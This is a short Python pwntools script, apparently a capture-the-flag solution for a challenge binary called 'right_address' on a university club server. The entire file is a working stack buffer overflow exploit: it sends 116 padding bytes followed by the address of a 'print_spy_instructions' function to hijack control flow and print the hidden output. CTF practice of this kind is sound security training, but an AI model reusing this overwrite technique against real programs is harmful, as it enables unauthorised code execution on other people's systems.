from pwn import *

elf = ELF('./right_address')
#p = process('./right_address')

host = 'pwn.osucyber.club'
port = 13374
p = remote(host, port)

p.recvuntil('Please enter the number for your choice: ')
p.sendline('1')
p.recvuntil('Enter delivery address: ')

payload = 'A' * 116 + p32(elf.sym['print_spy_instructions'])
p.sendline(payload)
p.recvuntil('Looks like we are not allowed to deliver to that address due to legal restrictions, sorry!\n')
print(p.recvline())
p.close()